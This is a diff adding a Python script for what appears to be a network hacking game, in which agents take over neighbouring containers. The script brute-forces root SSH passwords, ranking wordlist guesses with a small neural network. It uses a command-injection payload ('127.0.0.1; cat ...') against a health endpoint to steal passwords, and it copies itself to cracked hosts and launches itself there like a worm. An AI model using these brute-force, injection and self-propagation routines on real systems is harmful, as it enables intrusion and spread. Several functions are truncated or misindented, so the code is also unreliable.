@@ -1,0 +1,340 @@
+import os
+import time
+import socket
+import json
+import requests
+import subprocess
+import random
+from concurrent.futures import ThreadPoolExecutor
+
+# Try to import PyTorch for Neural Intelligence
+try:
+    import torch
+    import torch.nn as nn
+    import torch.optim as optim
+    HAS_TORCH = True
+except ImportError:
+    HAS_TORCH = False
+
+# --- CONFIG ---
+import sys
+ORCHESTRATOR = "http://arena_orchestrator:5000"
+# Use fixed IP if DNS fails: "http://172.20.0.12:5000"
+
+TEAM = sys.argv[1].upper() if len(sys.argv) > 1 else os.environ.get("TEAM", "RED")
+GRID_SIZE = int(os.environ.get("GRID_SIZE", 6))
+MEMORY_FILE = "neural_memory.pth" 
+IDENTITY_FILE = "identity.json"
+
+def get_identity():
+    # Helper to persist ID across migrations (files are copied, hostname changes)
+    if os.path.exists(IDENTITY_FILE):
+        try:
+            with open(IDENTITY_FILE, 'r') as f:
+                data = json.load(f)
+                return data.get("id")
+        except: pass
+    
+    # Generate New
+    new_id = f"Neural_{TEAM}_{socket.gethostname()[:5]}"
+    try:
+        with open(IDENTITY_FILE, 'w') as f:
+            json.dump({"id": new_id}, f)
+    except: pass
+    return new_id
+
+MY_ID = get_identity()
+
+def log(msg):
+    print(f"[{time.strftime('%H:%M:%S')}] {msg}")
+    try:
+        requests.post(f"{ORCHESTRATOR}/api/log", json={"gladiator_id": MY_ID, "message": msg, "type": "log"})
+    except Exception as e:
+        print(f"LOG ERROR: {e}")
+
+def log_status(msg):
+    print(f"\r[{time.strftime('%H:%M:%S')}] {msg}", end="")
+    try:
+        requests.post(f"{ORCHESTRATOR}/api/log", json={"gladiator_id": MY_ID, "message": msg, "type": "status"})
+    except Exception as e:
+        print(f"STATUS LOG ERROR: {e}")
+
+# --- NEURAL ARCHITECTURE ---
+class NeuralPredictor(nn.Module):
+    def __init__(self, input_dim=4, hidden_dim=32):
+        super(NeuralPredictor, self).__init__()
+        # Inputs: X, Y, Team_ID (0/1), Neighborhood_Entropy
+        self.network = nn.Sequential(
+            nn.Linear(input_dim, hidden_dim),
+            nn.ReLU(),
+            nn.Linear(hidden_dim, hidden_dim),
+            nn.ReLU(),
+            nn.Linear(hidden_dim, 7) # 4 Themes + 3 Mutations
+        )
+        self.softmax = nn.Softmax(dim=1)
+
+    def forward(self, x):
+        return self.network(x)
+
+# --- GLOBAL STATE ---
+device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
+model = None
+optimizer = None
+criterion = nn.CrossEntropyLoss()
+
+THEMES = {
+    0: "admin_root", # [admin, root, password]
+    1: "rpg",        # [dragon, shadow, master]
+    2: "arena",      # [spartacus, gladiator, battle]
+    3: "mixed"       # [qwerty, 123456, security]
+}
+MUTATIONS = {
+    0: "raw",
+    1: "digit_1",
+    2: "digit_2"
+}
+
+def init_neural_engine():
+    global model, optimizer
+    if not HAS_TORCH:
+        log("⚠️ PyTorch not found. Falling back to simple weights.")
+        return
+
+    model = NeuralPredictor().to(device)
+    optimizer = optim.Adam(model.parameters(), lr=0.01)
+    
+    if os.path.exists(MEMORY_FILE):
+        try:
+            model.load_state_dict(torch.load(MEMORY_FILE, map_location=device))
+            log(f"🧠 NEURAL ENGINE: LOADED. Device: {device}")
+        except:
+            log("🧠 NEURAL ENGINE: INIT NEW.")
+    else:
+        log(f"🧠 NEURAL ENGINE: ONLINE. Device: {device}")
+
+def save_neural_memory():
+    if HAS_TORCH and model:
+        torch.save(model.state_dict(), MEMORY_FILE)
+
+def get_input_tensor(x, y):
+    # Normalize inputs for the network
+    team_val = 1.0 if TEAM == "RED" else 0.0
+    entropy = (x * y) / (GRID_SIZE * GRID_SIZE) # Dummy entropy signal
+    return torch.FloatTensor([[x/GRID_SIZE, y/GRID_SIZE, team_val, entropy]]).to(device)
+
+def get_neural_priorities(x, y):
+    if not HAS_TORCH or not model:
+        return [0, 1, 2, 3], [0, 1, 2] # Default
+
+    model.eval()
+    with torch.no_grad():
+        inputs = get_input_tensor(x, y)
+        outputs = model(inputs)
+        
+        # Split output into Theme (0-3) and Mutation (4-6)
+        theme_logits = outputs[0, :4]
+        mut_logits = outputs[0, 4:]
+        
+        theme_order = torch.argsort(theme_logits, descending=True).tolist()
+        mut_order = torch.argsort(mut_logits, descending=True).tolist()
+        
+    return theme_order, mut_order
+
+def train_on_success(x, y, theme_idx, mut_idx):
+    if not HAS_TORCH or not model: return
+    
+    log(f"🔥 Online Training: Strengthening path ({theme_idx}, {mut_idx}) for ({x},{y})")
+    model.train()
+    optimizer.zero_grad()
+    
+    inputs = get_input_tensor(x, y)
+    outputs = model(inputs)
+    
+    # Target: We want theme_idx and mut_idx to be the global maximums
+    # Simplified: Multi-label cross entropy or just two separate targets
+    # We'll do a simple hard target for the successful combination
+    target_theme = torch.tensor([theme_idx]).to(device)
+    target_mut = torch.tensor([mut_idx]).to(device)
+    
+    loss_theme = criterion(outputs[:, :4], target_theme)
+    loss_mut = criterion(outputs[:, 4:], target_mut)
+    
+    (loss_theme + loss_mut).backward()
+    optimizer.step()
+    save_neural_memory()
+
+# --- HACKING LOGIC ---
+WORDS = {
+    0: ["admin", "root", "password"],
+    1: ["dragon", "shadow", "master"],
+    2: ["spartacus", "gladiator", "battle", "arena"],
+    3: ["qwerty", "123456", "security"]
+}
+
+import paramiko
+
+def attempt_login(password, ip):
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(ip, username='root', password=password, timeout=2, banner_timeout=5)
+        ssh.close()
+        return True
+    except (paramiko.AuthenticationException, paramiko.SSHException, socket.timeout, Exception):
+        return False
+
+def scout_clue(ip):
+    try:
+        # Try to get intel from port 8000
+        res = requests.get(f"http://{ip}:8000/clue.txt", timeout=1)
+        if res.status_code == 200:
+            clue = res.text.strip()
+            log(f"🕵️ INTEL FOUND: {clue}")
+            return clue
+    except Exception as e:
+        print(f"SCOUT ERROR: {e}")
+    return None
+
+def exploit_rce(ip):
+    try:
+        # The Exploit: Inject command into 'check' parameter
+        # check=127.0.0.1; cat /gladiator/password_hint.txt
+        payload = "127.0.0.1; cat /gladiator/password_hint.txt"
+        url = f"http://{ip}:8000/health?check={payload}"
+        
+        log_status(f"⚡ RCE: Injecting payload at {ip}...")
+        res = requests.get(url, timeout=2)
+        
+        if res.status_code == 200:
+            # Output format:
+            # PING 127.0.0.1 ...
+            # ...
+            # Container Started. Root Password set to: <PASSWORD>
+            
+            content = res.text
+            if "Root Password set to:" in content:
+                password = content.split("Root Password set to:")[1].strip()
+                log(f"💥 EXPLOIT SUCCESS (RCE): Stole Password '{password}'")
+                return password
+    except: pass
+    return None
+
+def crack_node(ip, x, y):
+    # 0. Try RCE Exploit (The "Smart" Way)
+def neural_hack(ip, x, y):
+    # 1. Scout for Clues (The "Traditional" Way)
+    scout_clue(ip) 
+    
+    theme_order, mut_order = get_neural_priorities(x, y)
+    
+    log(f"🧠 Neural Analysis complete. Prioritizing Theme {theme_order[0]} and Mutation {mut_order[0]}.")
+    
+    for t_idx in theme_order:
+        base_words = WORDS[t_idx]
+        for m_idx in mut_order:
+            # Generate guesses for this combination
+            guesses = []
+            if m_idx == 0: # Raw
+                guesses = base_words
+            elif m_idx == 1: # 1-Digit
+                for i in range(10): 
+                    for w in base_words: guesses.append(f"{w}{i}")
+            elif m_idx == 2: # 2-Digit
+                for i in range(100):
+                    for w in base_words: guesses.append(f"{w}{i}")
+            
+            # Prune to avoid firewall lockout (10 tries per node roughly)
+            for i, pwd in enumerate(guesses):
+                if i > 25: break 
+        if i > 25: break 
+                log_status(f"🔑 Trying: {pwd}")
+                if attempt_login(pwd, ip):
+                    log(f"🔓 NEURAL SUCCESS: {pwd}")
+                    train_on_success(x, y, t_idx, m_idx)
+                    return pwd  # Return the password
+    return None
+
+def migrate_self(target_ip, password, team):
+    """
+    Autonomously migrate to target node via SSH/SCP.
+    This is TRUE migration - we copy ourselves and start a new instance.
+    """
+    try:
+        log(f"🚀 Initiating self-migration to {target_ip}...")
+        
+        # 1. Connect to target via SSH
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddHostPolicy())
+        ssh.connect(target_ip, username='root', password=password, timeout=5)
+        
+        # 2. Copy our script and memory files via SCP
+        sftp = ssh.open_sftp()
+        
+        # Copy the main script
+        sftp.put('/gladiator/neural_gladiator.py', '/gladiator/neural_gladiator.py')
+        log(f"📦 Copied neural_gladiator.py to {target_ip}")
+        
+        # Copy memory files if they exist
+        for filename in ['memory.json', 'identity.json']:
+            local_path = f'/gladiator/{filename}'
+            if os.path.exists(local_path):
+                sftp.put(local_path, local_path)
+                log(f"📦 Copied {filename} to {target_ip}")
+        
+        sftp.close()
+        
+        # 3. Start ourselves on the target node
+        cmd = f'cd /gladiator && nohup python3 neural_gladiator.py {team} > /dev/null 2>&1 &'
+        ssh.exec_command(cmd)
+        ssh.close()
+        
+        log(f"✅ Migration complete! New instance started at {target_ip}")
+        return True
+        
+    except Exception as e:
+        log(f"❌ Migration failed: {e}")
+        import traceback
+        traceback.print_exc()
+        return False
+
+def main():
+    init_neural_engine()
+    log(f"Gladiator {MY_ID} deployed on Node.")
+    requests.post(f"{ORCHESTRATOR}/api/register", json={"gladiator_id": MY_ID})
+    
+    # Get IP to find neighbors
+    hostname = socket.gethostname()
+    my_ip = socket.gethostbyname(hostname)
+    # Parse coords from IP
+    parts = my_ip.split('.')
+    my_y, my_x = int(parts[2]), int(parts[3]) - 10
+
+    # CLAIM SELF to appear on map
+    log(f"📍 Announcing presence at {my_ip}...")
+    requests.post(f"{ORCHESTRATOR}/api/claim", json={"gladiator_id": MY_ID, "target_ip": my_ip})
+    
+    while True:
+        # Scan immediate neighbors
+        for dy in [-1, 0, 1]:
+            for dx in [-1, 0, 1]:
+                if dx == 0 and dy == 0: continue
+                tx, ty = my_x + dx, my_y + dy
+                if 0 <= tx < GRID_SIZE and 0 <= ty < GRID_SIZE:
+                    target_ip = f"172.20.{ty}.{10+tx}"
+                    log(f"🔎 Scanning neighbor {target_ip}...")
+                    if crack_node(target_ip, tx, ty):
+                        log(f"🚩 CLAIMING {target_ip}...")
+                        try:
+                            res = requests.post(f"{ORCHESTRATOR}/api/claim", json={"gladiator_id": MY_ID, "target_ip": target_ip})
+                            if res.status_code != 200:
+                                log(f"❌ CLAIM ERROR: {res.text}")
+                            else:
+                                log(f"✅ Migration initiated to ({tx},{ty}). Exiting for physical transfer...")
+                                return  # Orchestrator will copy files and restart us
+                        except Exception as e:
+                            print(f"CLAIM NETWORK ERROR: {e}")
+                            
+        time.sleep(10)
+
+if __name__ == "__main__":
+    main()
